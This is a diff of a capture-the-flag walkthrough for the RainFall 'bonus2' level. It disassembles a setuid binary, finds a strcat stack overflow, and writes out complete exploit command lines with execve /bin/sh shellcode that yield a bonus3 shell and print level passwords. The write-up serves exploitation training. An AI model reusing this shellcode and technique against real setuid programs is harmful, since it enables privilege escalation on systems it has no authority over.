@@ -1,17 +1,29 @@
 #+title: Walkthrough
 * Access
+#+begin_src shell
 bonus1@RainFall:~$ su bonus2
 Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+#+end_src
 * Data Gathering:
-# Analize the file
+** Sticky bit
+#+begin_src shell
 ls -lhtr 
 total 8.0K
 -rwsr-s---+ 1 bonus3 users 5.6K Mar  6  2016 bonus2
-## any string?
-bonus2@RainFall:~$ readelf -p .rodata
-bonus2@RainFall:~$
-### look like no
-## look for functions
+#+end_src
+** String
+#+begin_src shell
+readelf -p .rodata $USER
+
+String dump of section '.rodata':
+  [     8]  Hello 
+  [     f]  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv
+  [    22]  Goedemiddag! 
+  [    30]  LANG
+  [    35]  fi
+  [    38]  nl
+#+end_src
+** Functions
 #+begin_src shell
 info functions @plt
 All functions matching regular expression "@plt":
@@ -29,9 +41,81 @@ Non-debugging symbols:
 0x08048484  greetuser 
 0x08048529  main
 #+end_src
-
-## look for the logic of the functions
-### Remember
+** Global vars
+#+begin_src shell
+info var
+All defined variables:
+Non-debugging symbols:
+0x08049988  language
+#+end_src
+* Binary Analisys
+** Functions
+#+begin_src shell
+disass greetuser
+Dump of assembler code for function greetuser:
+   0x08048484 <+0>:	push   ebp
+   0x08048485 <+1>:	mov    ebp,esp
+   0x08048487 <+3>:	sub    esp,0x58 -> 88 B
+   0x0804848a <+6>:	mov    eax,ds:0x8049988 -> global var 
+   0x0804848f <+11>:	cmp    eax,0x1 -> is 'fi'
+   0x08048492 <+14>:	je     0x80484ba <greetuser+54> -> yes jmp 
+   0x08048494 <+16>:	cmp    eax,0x2  -> is 'nl'
+   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> -> yes jmp 
+   0x08048499 <+21>:	test   eax,eax  -> is zero
+   0x0804849b <+23>:	jne    0x804850a <greetuser+134> -> yes concat
+   0x0804849d <+25>:	mov    edx,0x8048710 -> "Hello "
+   0x080484a2 <+30>:	lea    eax,[ebp-0x48] -> buffer of 72 B
+   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
+   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx -> copy 'Hell' as a DWORD
+   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4] move ptr
+   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx -> copy 'o ' as a WORD
+   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]-> copy '\0' as a Byte
+   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
+   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
+   0x080484ba <+54>:	mov    edx,0x8048717
+   0x080484bf <+59>:	lea    eax,[ebp-0x48]
+   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
+   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
+   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
+   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
+   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
+   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
+   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
+   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
+   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
+   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
+   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
+   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
+   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
+   0x080484e9 <+101>:	mov    edx,0x804872a
+   0x080484ee <+106>:	lea    eax,[ebp-0x48]
+   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
+   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
+   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
+   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
+   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
+   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
+   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
+   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
+   0x08048509 <+133>:	nop
+   0x0804850a <+134>:	lea    eax,[ebp+0x8] -> param
+   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax -> param 2
+   0x08048511 <+141>:	lea    eax,[ebp-0x48] -> buffer "Hello "
+   0x08048514 <+144>:	mov    DWORD PTR [esp],eax -> param1
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
+   0x0804851c <+152>:	lea    eax,[ebp-0x48] -> buffer "Hello " + param
+   0x0804851f <+155>:	mov    DWORD PTR [esp],eax  -> param 1
+   0x08048522 <+158>:	call   0x8048390 <puts@plt>  print
+   0x08048527 <+163>:	leave  
+   0x08048528 <+164>:	ret    
+(gdb) p (char *)0x8048710
+$6 = 0x8048710 "Hello " 
+(gdb) p (char *)0x8048717
+$7 = 0x8048717 "Hyv√§√§ p√§iv√§√§ "
+(gdb) p (char *)0x804872a
+$8 = 0x804872a "Goedemiddag! "
+#+end_src
+*** Remember
 rep stos is a repeating store  instruction:  
 
     eax holds the value to store (0).  
@@ -116,175 +200,209 @@ End of assembler dump.
 
 rep movs DWORD PTR es:[edi], DWORD PTR ds:[esi]    
 
+#+begin_src shell
     Repeating move operation:             buffer[76]
         Copies 19 DWORDs (76 bytes)  from the source (esi = esp + 0x50) to the destination (edi = esp).  
-        After each copy, both pointers (esi and edi) are incremented by 4 bytes  (since it‚Äôs a DWORD move).
-         
-    Result:  The memory block from [esp + 0x50] to [esp + 0x50 + 76] is copied to [esp] to [esp + 76].
-#+begin_src shell
-p (char *)0x8048738
-$2 = 0x8048738 "LANG"
-p (char *)0x804873d
-$3 = 0x804873d "fi"
-p (char *)0x8048740
-$5 = 0x8048740 "nl"
+        After each copy, both pointers (esi and edi) are incremented by 4 bytes  (since its a DWORD move).
 #+end_src
-# Code
-
-#+begin_src shell
-disass greetuser
-Dump of assembler code for function greetuser:
-   0x08048484 <+0>:	push   ebp
-   0x08048485 <+1>:	mov    ebp,esp
-   0x08048487 <+3>:	sub    esp,0x58 -> 88 B
-   0x0804848a <+6>:	mov    eax,ds:0x8049988 -> global var 
-   0x0804848f <+11>:	cmp    eax,0x1 -> is 'fi'
-   0x08048492 <+14>:	je     0x80484ba <greetuser+54> -> yes jmp 
-   0x08048494 <+16>:	cmp    eax,0x2  -> is 'nl'
-   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> -> yes jmp 
-   0x08048499 <+21>:	test   eax,eax  -> is zero
-   0x0804849b <+23>:	jne    0x804850a <greetuser+134> -> yes concat
-   0x0804849d <+25>:	mov    edx,0x8048710 -> "Hello "
-   0x080484a2 <+30>:	lea    eax,[ebp-0x48] -> buffer of 72 B
-   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
-   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx -> copy 'Hell' as a DWORD
-   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4] move ptr
-   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx -> copy 'o ' as a WORD
-   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]-> copy '\0' as a Byte
-   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
-   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
-   0x080484ba <+54>:	mov    edx,0x8048717
-   0x080484bf <+59>:	lea    eax,[ebp-0x48]
-   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
-   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
-   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
-   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
-   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
-   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
-   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
-   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
-   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
-   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
-   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
-   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
-   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
-   0x080484e9 <+101>:	mov    edx,0x804872a
-   0x080484ee <+106>:	lea    eax,[ebp-0x48]
-   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
-   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
-   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
-   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
-   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
-   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
-   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
-   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
-   0x08048509 <+133>:	nop
-   0x0804850a <+134>:	lea    eax,[ebp+0x8] -> param
-   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax -> param 2
-   0x08048511 <+141>:	lea    eax,[ebp-0x48] -> buffer "Hello "
-   0x08048514 <+144>:	mov    DWORD PTR [esp],eax -> param1
-   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
-   0x0804851c <+152>:	lea    eax,[ebp-0x48] -> buffer "Hello " + param
-   0x0804851f <+155>:	mov    DWORD PTR [esp],eax  -> param 1
-   0x08048522 <+158>:	call   0x8048390 <puts@plt>  print
-   0x08048527 <+163>:	leave  
-   0x08048528 <+164>:	ret    
-(gdb) p (char *)0x8048710
-$6 = 0x8048710 "Hello " 
-(gdb) p (char *)0x8048717
-$7 = 0x8048717 "Hyv√§√§ p√§iv√§√§ "
-(gdb) p (char *)0x804872a
-$8 = 0x804872a "Goedemiddag! "
+** Source
+[[source]]
+** Exploit Estrategy
+*** modify return greetuser.
+try to overflow buffer of greetuser for modify the return va. 
+**** Get the offset
+#+begin_src shell :tangle no
+  Breakpoint 2, 0x08048514 in greetuser ()
+  (gdb) x/s $eax
+  0xbffffb50:	 "Hello "
+  (gdb) x/a $ebp + 4
+  0xbffffb9c:	0x8048630 <main+263>
+  p/d ($ebp + 4) - $eax
+  $4 = 76
 #+end_src
-Flow Summary  
+***** Verify the alteration of return va.
+  Math
+#+begin_src quote
+  76 < 73 + string_len # Last char '\0' Don't full ctrl.
+
+  76 + 4 (sizeof(va)) < 73 + string_len
+  [     8]  Hello 
+  [     f]  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv
+  [    22]  Goedemiddag! 
+  [    30]
+  p (0xf-8) - 1 # reach the null char not the next char.
+"Hello ".len() = 6
+p (0x22-0xf) -1
+"Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv ".len() = 18
+p (0x30-0x22) -1
+"Goedemiddag! ".len() = 13
+  Hello
+  80 < 79 if we want full ctrl is 78 
+  76 - 6 = 70
+  70 - 40 = 30
+  30 <= 32 offset in argv[2] 
+  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv 
+  80 < 18 + 73
+  76 - 18 = 58
+  58 - 40 (argv[1])
+  18 <= 32 offset in argv[2]
+  80 < 13 + 73
+  Goedemiddag! 
+  76 - 13 = 63
+  63 - 40 = 23
+  23 <= 32 offset in argv[2] 
+#+end_src
+****** default test 
+#+begin_src shell
+  x/a $ebp + 4
+  0xbffffb5c:	0x8048630 <main+263>
+  (gdb) x/i $eip
+  => 0x8048514 <greetuser+144>:	mov    %eax,(%esp)
+  (gdb) si
+  0x08048517 in greetuser ()
+  (gdb) x/i $eip
+  => 0x8048517 <greetuser+147>:	call   0x8048370 <strcat@plt>
+  (gdb) si
+  0x08048370 in strcat@plt ()
+  (gdb) fin
+  Run till exit from #0  0x08048370 in strcat@plt ()
+  0x0804851c in greetuser ()
+  (gdb) x/a $ebp + 4 #  "\0BB" I am close but i need a large string use env LANG.
+    0xbffffb5c:	0x8004242
+#+end_src
+****** fi test
+#+begin_src shell
+      unset env LINES 
+      unset env COLUMNS
+      set env LANG=fi
+    show env
+    TERM=dumb
+    SHELL=/bin/bash
+    SSH_CLIENT=10.0.2.2 56016 4242
+    SSH_TTY=/dev/pts/0
+    USER=bonus2
+    LS_COLORS=
+    MAIL=/var/mail/bonus2
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+    PWD=/home/user/bonus2
+    LANG=fi
+    SHLVL=1
+    HOME=/home/user/bonus2
+    LOGNAME=bonus2
+    SSH_CONNECTION=10.0.2.2 56016 10.0.2.15 4242
+    LESSOPEN=| /usr/bin/lesspipe %s
+    LESSCLOSE=/usr/bin/lesspipe %s %s
+    _=/usr/bin/gdb
+    OLDPWD=/home/user/bonus2
+  (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAADCBA
+(gdb) x/a $ebp+4
+0xbffffb7c:	0x41424344
+x/s $eax
+
+0xbffffb30:	 "Hyv√§√§ p√§iv√§√§ ", 'A' <repeats 58 times>, "DCBA"
+
+#+end_src
+
+****** nl test
+#+begin_src shell
+unset env LINES 
+unset env COLUMNS
+set env LANG=nl
+show env
+TERM=dumb
+SHELL=/bin/bash
+SSH_CLIENT=10.0.2.2 56016 4242
+SSH_TTY=/dev/pts/0
+USER=bonus2
+LS_COLORS=
+MAIL=/var/mail/bonus2
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+PWD=/home/user/bonus2
+LANG="nl"
+SHLVL=1
+HOME=/home/user/bonus2
+LOGNAME=bonus2
+SSH_CONNECTION=10.0.2.2 56016 10.0.2.15 4242
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/gdb
+OLDPWD=/home/user/bonus2
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBDCBA
+Breakpoint 1, 0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) fin
+Run till exit from #0  0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
+0x0804851c in greetuser ()
+(gdb) x/a $ebp+4
+0xbffffb7c:	0x41424344
+
+#+end_src
+*** Where to aim that return va
+ we don't got any system.
+ we gonna use a ~shellcode~
+ shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+**** Where is storage:
+There different ways:
+1. we could use username (argv[1] part first 40B) in whatever scenario watch out gdb env vars change stack va's.
+2. in case fi and nl we can also use argv[2] the payload is 23B
+3. Use an env var.
+***** Verify use argv[1]
+#+begin_src shell
+  r $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xc0"[::-1]')
+  Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xc0"[::-1]')
+
+  Breakpoint 2, 0x08048574 in main ()
+  (gdb) x/s $eax
+  0xbffffbc0:	 ""
+  (gdb) c
+  Continuing.
+
+  Breakpoint 1, 0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
+  (gdb) x/a $ebp+4
+  0xbffffb6c:	0x8048630 <main+263>
+  (gdb) fin
+  Run till exit from #0  0xb7ebb7c0 in ?? () from /lib/i386-linux-gnu/libc.so.6
+  0x0804851c in greetuser ()
+  (gdb) x/a $ebp+4
+  0xbffffb6c:	0xbffffbc0
+  (gdb) c
+  Continuing.
+  Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêê1¿Ph//shh/binâ„PSâ·∞ÕÄBBBBBBBBBBBBBBBBBB¿˚ˇø
+  process 2701 is executing new program: /bin/dash
+  /bin//sh: relocation error: /bin//sh: symbol scntrl, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+  [Inferior 1 (process 2701) exited with code 0177]
+  # weird gdb error i could once but not twice, give an error but i could use system or run the /bin/dash normally.
+#+end_src
+[40B                                       ] = argv[1]
+"sled(nops) + shellcode"
+[32B Max              ]  = argv[2]
+"sled(offset)+va"
 
 
-The code generates a greeting message based on a global flag: 
 
-    Global Flag = 1 ('fi') :
-    Jumps to a ... same as "hello " but in another language"
-    Global Flag = 2 ('nl') :
-    Jumps to a ... same as "hello " but in another language"
+* Exploit
 
-    Skips the "Hello " setup and directly appends to an existing buffer (assumed initialized elsewhere). Weird may Sploitable
-    Global Flag = 0 (default) :
-    Constructs "Hello " in a buffer, appends another string (e.g., a name), and prints it.
+      I need to guest the stack va of main buffer i will add 0x10 to gdb until success.
 
-# Code
-info var
-All defined variables:
-Non-debugging symbols:
-0x08049988  language -> is the oficial name of g_var
-# launch for test what we see.
-bonus2@RainFall:~$ ltrace ./bonus2
-__libc_start_main(0x8048529, 1, 0xbffffd14, 0x8048640, 0x80486b0 <unfinished ...>
-+++ exited (status 1) +++
-bonus2@RainFall:~$ ltrace ./bonus2 "" ""
-__libc_start_main(0x8048529, 3, 0xbffffcf4, 0x8048640, 0x80486b0 <unfinished ...>
-strncpy(0xbffffbf0, "", 40)                           = 0xbffffbf0
-strncpy(0xbffffc18, "", 32)                           = 0xbffffc18
-getenv("LANG")                                        = "en_US.UTF-8"
-memcmp(0xbfffff12, 0x804873d, 2, 0xb7fff918, 0)       = -1
-memcmp(0xbfffff12, 0x8048740, 2, 0xb7fff918, 0)       = -1
-strcat("Hello ", "")                                  = "Hello "
-puts("Hello "Hello 
-)                                        = 7
-+++ exited (status 7) +++
+** try and error
+#+begin_src shell
+      ./$USER $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xc0"[::-1]')
+      Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêê1¿Ph//shh/binâ„PSâ·∞ÕÄBBBBBBBBBBBBBBBBBB¿˚ˇø
+      Segmentation fault (core dumped)
+    #0xd0
+        ./$USER $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xd0"[::-1]')
+        Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêê1¿Ph//shh/binâ„PSâ·∞ÕÄBBBBBBBBBBBBBBBBBB–˚ˇø
+        Segmentation fault (core dumped)
+#+end_src
+** Sucessful one
+#+begin_src shell
 
-r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2
-Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
-Program received signal SIGSEGV, Segmentation fault.
-0x08040041 in ?? () -> no offset, maybe need a longer prefix to reach further.
-#unset LANG and repeat with a short offset
-run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
-Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+          ./$USER $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xe0"[::-1]')
 
-Program received signal SIGSEGV, Segmentation fault.
-0x08006241 in ?? () -> no offset, maybe need a longer prefix to reach further.
-# set LANG to fi
-bonus2@RainFall:~$ export LANG='fi'
-bonus2@RainFall:~$ ./bonus2 a b
-Hyv√§√§ p√§iv√§√§ a
-# let's repeat offset 
-# Exploit
-## user input.
-### argv[1] >= 40 B -> not null char ended string in strncpy main.
-### argv[2] <= 32
-### on greetuser concat without check the size of the str
-### overflow return address greetuser.
->>>>>>>>(gdb) run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
-Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
-Hyv√§√§ p√§iv√§√§ BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+  $ id
+  uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+  $ whoami
+  bonus3
+  $ cat /home/user/`whoami`/.pass
+  71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 
-Program received signal SIGSEGV, Segmentation fault.
-Error while running hook_stop:
-No function contains program counter for selected frame.
-0x41366141 in ?? () -> 18 offset on argv[2].
-shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-prefix = 40 - 21 = 19 NOP (\x90)
-Inject the shellcode in argv[1] = 21 B
-
-## take the main_buffer addres
-b *main+35
-   0x08048548 <+31>:	lea    ebx,[esp+0x50] -> this is the buffer
-=> 0x0804854c <+35>:	mov    eax,0x0
-(gdb) p $esp + 0x50
-$2 = (void *) 0xbffffbb0
-main_buffer addres 0xbffffbb0
-##we got the shellstorm, the offset, the address.
-argv[1] = $(python -c 'print "\x90" * 19 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
-argv[2] = $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xb0"[::-1] ' )
-let's launch in gdb to test we got the shell.
-Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêêêêjXôRh//shh/binâ„1…ÕÄBBBBBBBBBBBBBBBBBB∞˚ˇø
-process 3417 is executing new program: /bin/dash # -> look fine
-Error in re-setting breakpoint 7: Function "main" not defined.
-$ id
-uid=2012(bonus2) gid=2012(bonus2) groups=2012(bonus2),100(users)
-## All fine let's excalate without gdb.
-bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 19 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xb0"[::-1] ' )
-Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêêêêjXôRh//shh/binâ„1…ÕÄBBBBBBBBBBBBBBBBBB∞˚ˇø
-$ id
-uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
-$ cat /home/user/bonus3/.pass
-71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
-// pass 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+#+end_src
